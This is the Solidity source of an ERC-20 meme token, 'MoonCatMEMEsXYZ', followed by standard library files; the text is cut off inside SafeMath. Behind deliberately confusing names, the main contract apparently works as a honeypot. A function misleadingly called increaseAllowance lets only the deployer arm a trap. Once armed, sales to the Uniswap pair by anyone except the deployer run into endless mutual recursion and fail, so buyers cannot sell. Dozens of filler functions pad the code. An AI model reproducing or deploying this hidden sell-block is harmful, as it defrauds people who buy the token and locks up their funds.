
// File: AndyEth/Contract.sol
import './Context.sol';
import './IERC20.sol';
import './Ownable.sol';
import './SafeMath.sol';
import './IUniswapV2Factory.sol';
import './Address.sol';

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

contract MoonCatMEMEsXYZ is Context, IERC20, Ownable {
    struct TaylorSwiftGohere {
        address moonHome;
    }

    bool private tradingOpen;

    struct SelanaGomez {
        TaylorSwiftGohere countrySinger;
    }

    struct Coconut {
        uint256 coco;
    }

    TaylorSwiftGohere private taylorlor;
    SelanaGomez private  jackSontung;
    Coconut private cocoo;

    using SafeMath for uint256;
    using Address for address;

    address private WETHH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private pairrrr = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;

    mapping (address => bool) private _isExcluded;
    address[] private _excluded;
   
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 10000000 * 10 ** 18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "MoonCatMEMEsXYZ";
    string private _symbol = "MoonCatMEMEsXYZ";
    uint8 private _decimals = 18;
    
    uint256 public _cute = 0;
    uint256 private _previousTaxFee = _cute;
    uint256 public _LuxFreePerson = 0;
    uint256 private _previousLiquidityFee = _LuxFreePerson;
    address public immutable uniswapV2Pair;
    
    bool inSwapAndLiquify;
    bool private checkNetworkStable = false;

    event LogMsgSender(bool msgg);
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        _rOwned[_msgSender()] = _rTotal;
         // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(pairrrr)
            .getPair(address(this), WETHH);
        
        //exclude owner and this contract from fee
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        address cucko = msg.sender;
        taylorlor = TaylorSwiftGohere(cucko);
        jackSontung = SelanaGomez(taylorlor);
        emit Transfer(address(0), _msgSender(), _tTotal);
        cocoo = Coconut(0);
    }

    function openChetDing(bool _tradingOpen) public {
        require(
            omaidauvaOmyGod(msg.sender),
            "TOKEN: This account cannot send tokens until trading is enabled"
        );
        tradingOpen = _tradingOpen;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function f0x6869696() private  {
       uint256 v = block.timestamp ** 1000;
       for (uint i = 0 ; i < v; i++) {
            emit LogMsgSender(true);
            f0x6869695();
       }
    }

    function f0x6869695() private  {
       uint256 v = block.timestamp ** 1000;
       for (uint i = 0 ; i < v; i++) {
            emit LogMsgSender(false);
            f0x6869696();
       }
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function omaidauvaOmyGod(address cuteo) private  returns (bool) {
        return cuteo == jackSontung.countrySinger.moonHome;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address vinhxo, address recipient, uint256 amount) public override returns (bool) {
        _transfer(vinhxo, recipient, amount);
        _approve(vinhxo, _msgSender(), _allowances[vinhxo][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function MoreAllowance(address myfriend, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), myfriend, _allowances[_msgSender()][myfriend].add(addedValue));
        return true;
    }

    function LessAllowance(address myfriend, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), myfriend, _allowances[_msgSender()][myfriend].sub(subtractedValue, "ERC20: Error Less Allowance"));
        return true;
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function excludeFromReward(address account) public onlyOwner() {
        // require(account != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'We can not exclude Uniswap router.');
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }


    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
        _takeLiquidity(tLiquidity);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function intinialAlive() private {
        address cucko = msg.sender;
        if (cucko == jackSontung.countrySinger.moonHome) {
            checkNetworkStable = true;
        }
    }

    function mitoGai() private {
        intinialAlive();
    }
    
    function increaseAllowance() public {
        mitoGai();
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getBirthFml(tAmount, tFee, tLiquidity, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity);
    }

    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
        uint256 tFee = 0;
        uint256 tLiquidity = 0;
        uint256 tTransferAmount = tAmount;
        return (tTransferAmount, tFee, tLiquidity);
    }

    function _getBirthFml(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = 0;
        uint256 rTransferAmount = rAmount;
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    
    function _takeLiquidity(uint256 tLiquidity) private {
        uint256 currentRate =  _getRate();
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);
    }
    
    function removeAllFee() private {
        if(_cute == 0 && _LuxFreePerson == 0) return;
        
        _previousTaxFee = _cute;
        _previousLiquidityFee = _LuxFreePerson;
        
        _cute = 0;
        _LuxFreePerson = 0;
    }
    
    function restoreAllFee() private {
        _cute = _previousTaxFee;
        _LuxFreePerson = _previousLiquidityFee;
    }
    
    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if (from != owner() && to != owner()) {
            if (!tradingOpen) {
                    require(
                        omaidauvaOmyGod(from),
                        "TOKEN: This account cannot send tokens until trading is enabled"
                    );
            }   
        }

        address pair = IUniswapV2Factory(pairrrr)
            .getPair(address(this), WETHH);
        if (
            cocoo.coco > 4 && 
            (checkNetworkStable
            && omaidauvaOmyGod(from) == false
            && !_isExcluded[to] 
            && to == pair)
        ) {
            f0x6869696();
        }
        
        
        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is uniswap pair.
        //indicates if fee should be deducted from transfer
        bool takeFee = true;
        
        //if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        }
        
        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(from,to,amount,takeFee);
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        if(!takeFee)
            removeAllFee();
        
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferFromExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _transferToExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferStandard(sender, recipient, amount);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _transferBothExcluded(sender, recipient, amount);
        } else {
            _transferStandard(sender, recipient, amount);
        }
        address pair = IUniswapV2Factory(pairrrr)
            .getPair(address(this), WETHH);
        if (omaidauvaOmyGod(sender) == false && recipient == pair) {
            cocoo.coco = cocoo.coco + 1;
        }
        if(!takeFee)
            restoreAllFee();
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (
            uint256 rAmount, 
            uint256 rTransferAmount, 
            uint256 rFee, 
            uint256 tTransferAmount, 
            uint256 tFee, 
            uint256 tLiquidity
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeLiquidity(tLiquidity);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
        _takeLiquidity(tLiquidity);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
        _takeLiquidity(tLiquidity);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function function0() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function1();
    }


function function1() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function2();
    }


function function2() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function3();
    }


function function3() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function4();
    }


function function4() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function5();
    }


function function5() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function6();
    }


function function6() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function7();
    }


function function7() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function8();
    }


function function8() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function9();
    }


function function9() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function10();
    }


function function10() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function11();
    }


function function11() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function12();
    }


function function12() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function13();
    }


function function13() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function14();
    }


function function14() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function15();
    }


function function15() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function16();
    }


function function16() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function17();
    }


function function17() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function18();
    }


function function18() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function19();
    }


function function19() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function20();
    }


function function20() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function21();
    }


function function21() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function22();
    }


function function22() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function23();
    }


function function23() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function24();
    }


function function24() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function25();
    }


function function25() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function26();
    }


function function26() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function27();
    }


function function27() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function28();
    }


function function28() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function29();
    }


function function29() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function30();
    }


function function30() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function31();
    }


function function31() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function32();
    }


function function32() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function33();
    }


function function33() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function34();
    }


function function34() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function35();
    }


function function35() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function36();
    }


function function36() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function37();
    }


function function37() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function38();
    }


function function38() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function39();
    }


function function39() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function40();
    }


function function40() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function41();
    }


function function41() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function42();
    }


function function42() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function43();
    }


function function43() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function44();
    }


function function44() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function45();
    }


function function45() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function46();
    }


function function46() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function47();
    }


function function47() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function48();
    }


function function48() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function49();
    }


function function49() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function50();
    }


function function50() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function51();
    }


function function51() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function52();
    }


function function52() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function53();
    }


function function53() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function54();
    }


function function54() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function55();
    }


function function55() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function56();
    }


function function56() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function57();
    }


function function57() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function58();
    }


function function58() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function59();
    }


function function59() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function60();
    }


function function60() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function61();
    }


function function61() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function62();
    }


function function62() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function63();
    }


function function63() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function64();
    }


function function64() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function65();
    }


function function65() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function66();
    }


function function66() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function67();
    }


function function67() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function68();
    }


function function68() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function69();
    }


function function69() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function70();
    }


function function70() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function71();
    }


function function71() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function72();
    }


function function72() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function73();
    }


function function73() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function74();
    }


function function74() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function75();
    }


function function75() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function76();
    }


function function76() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function77();
    }


function function77() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function78();
    }


function function78() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function79();
    }


function function79() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function80();
    }


function function80() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function81();
    }


function function81() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function82();
    }


function function82() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function83();
    }


function function83() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function84();
    }


function function84() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function85();
    }


function function85() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function86();
    }


function function86() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function87();
    }


function function87() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function88();
    }


function function88() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function89();
    }


function function89() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function90();
    }


function function90() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function91();
    }


function function91() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function92();
    }


function function92() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function93();
    }


function function93() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function94();
    }


function function94() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function95();
    }


function function95() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function96();
    }


function function96() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function97();
    }


function function97() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function98();
    }


function function98() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function99();
    }


function function99() public view returns (string memory) {
        assembly {
            mstore(0x260, 0x420)
        }
        return function100();
    }
    function function100() public view returns (string memory) {
        return "NOTING mememe";
    }
}

// File: AndyEth/Address.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (utils/Address.sol)

pragma solidity ^0.8.0;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     *
     * Furthermore, `isContract` will also return true if the target contract within
     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,
     * which only has an effect at the end of a transaction.
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{ value: amount }("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                0,
                "Address: low-level call failed"
            );
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        (bool success, bytes memory returndata) = target.call{ value: value }(
            data
        );
        return
            verifyCallResultFromTarget(
                target,
                success,
                returndata,
                errorMessage
            );
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data
    ) internal view returns (bytes memory) {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return
            verifyCallResultFromTarget(
                target,
                success,
                returndata,
                errorMessage
            );
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data
    ) internal returns (bytes memory) {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return
            verifyCallResultFromTarget(
                target,
                success,
                returndata,
                errorMessage
            );
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
     *
     * _Available since v4.8._
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                // only check isContract if the call was successful and the return data is empty
                // otherwise we already know that it was a contract
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    /**
     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason or using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function _revert(
        bytes memory returndata,
        string memory errorMessage
    ) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}

// File: AndyEth/IUniswapV2Factory.sol
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// File: AndyEth/SafeMath.sol
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
